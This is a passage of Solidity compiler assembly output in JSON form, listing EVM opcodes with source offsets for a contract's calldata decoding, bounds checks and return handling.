											"begin": 11600,
											"end": 14446,
											"name": "ADD"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "DUP3"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "ADD"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 21,
											"end": 32,
											"name": "PUSH",
											"value": "100000000"
										},
										{
											"begin": 5,
											"end": 33,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 33,
											"name": "GT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "43"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 46,
											"end": 47,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 43,
											"end": 44,
											"name": "DUP1"
										},
										{
											"begin": 36,
											"end": 48,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "43"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "DUP3"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "ADD"
										},
										{
											"begin": 35,
											"end": 44,
											"name": "DUP4"
										},
										{
											"begin": 28,
											"end": 32,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 12,
											"end": 26,
											"name": "DUP3"
										},
										{
											"begin": 8,
											"end": 33,
											"name": "ADD"
										},
										{
											"begin": 5,
											"end": 45,
											"name": "GT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "44"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 58,
											"end": 59,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 55,
											"end": 56,
											"name": "DUP1"
										},
										{
											"begin": 48,
											"end": 60,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "44"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "DUP1"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "SWAP1"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "ADD"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "SWAP2"
										},
										{
											"begin": 100,
											"end": 109,
											"name": "DUP5"
										},
										{
											"begin": 95,
											"end": 96,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 81,
											"end": 93,
											"name": "DUP4"
										},
										{
											"begin": 77,
											"end": 97,
											"name": "MUL"
										},
										{
											"begin": 67,
											"end": 75,
											"name": "DUP5"
										},
										{
											"begin": 63,
											"end": 98,
											"name": "ADD"
										},
										{
											"begin": 60,
											"end": 110,
											"name": "GT"
										},
										{
											"begin": 39,
											"end": 50,
											"name": "PUSH",
											"value": "100000000"
										},
										{
											"begin": 25,
											"end": 37,
											"name": "DUP4"
										},
										{
											"begin": 22,
											"end": 51,
											"name": "GT"
										},
										{
											"begin": 11,
											"end": 118,
											"name": "OR"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "PUSH [tag]",
											"value": "45"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "JUMPI"
										},
										{
											"begin": 131,
											"end": 132,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 128,
											"end": 129,
											"name": "DUP1"
										},
										{
											"begin": 121,
											"end": 133,
											"name": "REVERT"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "tag",
											"value": "45"
										},
										{
											"begin": 8,
											"end": 10,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "SWAP1"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "PUSH [tag]",
											"value": "46"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "tag",
											"value": "41"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "JUMPDEST"
										},
										{
											"begin": 11600,
											"end": 14446,
											"name": "STOP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH [tag]",
											"value": "47"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH [tag]",
											"value": "48"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "47"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP6"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "49"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 33,
											"end": 36,
											"name": "DUP4"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "DUP2"
										},
										{
											"begin": 27,
											"end": 37,
											"name": "LT"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "51"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPI"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "DUP2"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "DUP2"
										},
										{
											"begin": 90,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 84,
											"end": 102,
											"name": "MLOAD"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "DUP4"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "DUP3"
										},
										{
											"begin": 71,
											"end": 82,
											"name": "ADD"
										},
										{
											"begin": 64,
											"end": 103,
											"name": "MSTORE"
										},
										{
											"begin": 52,
											"end": 54,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 45,
											"end": 55,
											"name": "ADD"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "PUSH [tag]",
											"value": "49"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMP"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "tag",
											"value": "51"
										},
										{
											"begin": 8,
											"end": 108,
											"name": "JUMPDEST"
										},
										{
											"begin": 12,
											"end": 26,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "AND"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ISZERO"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH [tag]",
											"value": "52"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPI"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP4"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "EXP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "NOT"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "AND"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "52"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP3"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SUB"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "SWAP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "RETURN"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "JUMPDEST"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "PUSH [tag]",
											"value": "53"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "PUSH [tag]",
											"value": "54"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "tag",
											"value": "53"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "JUMPDEST"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "DUP1"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "SWAP5"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "DUP6"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "AND"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "DUP2"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "MSTORE"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "SWAP3"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "SWAP1"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "SWAP4"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "AND"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "DUP4"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "ADD"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "MSTORE"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "AND"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "DUP2"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "DUP4"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "ADD"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "MSTORE"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "SWAP1"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "MLOAD"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "SWAP1"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "DUP2"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "SWAP1"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "SUB"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "ADD"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "SWAP1"
										},
										{
											"begin": 1280,
											"end": 1581,
											"name": "RETURN"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH [tag]",
											"value": "55"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "56"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "56"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "AND"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ADD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH [tag]",
											"value": "57"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "55"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "MLOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ISZERO"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ISZERO"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP3"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "MSTORE"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "MLOAD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "DUP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SUB"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "ADD"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "RETURN"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "JUMPDEST"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "PUSH [tag]",
											"value": "59"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "tag",
											"value": "58"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "JUMPDEST"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "DUP1"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "SWAP1"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "SWAP3"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "AND"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "DUP3"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "MSTORE"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "MLOAD"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "SWAP1"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "DUP2"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "SWAP1"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "SUB"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "ADD"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "SWAP1"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "RETURN"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "JUMPDEST"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "DUP1"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "61"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "61"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "DUP2"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "DUP2"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "AND"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "SWAP2"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "DUP2"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "ADD"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "SWAP1"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "SWAP2"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "AND"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "SWAP1"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "ADD"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "PUSH [tag]",
											"value": "62"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH [tag]",
											"value": "64"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "tag",
											"value": "63"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "MLOAD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP2"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP3"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "MSTORE"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "MLOAD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP2"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SUB"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "ADD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SWAP1"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "RETURN"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMPDEST"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH [tag]",
											"value": "55"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "66"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "66"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "AND"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "DUP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "ADD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP2"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "AND"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP1"
										},
										{
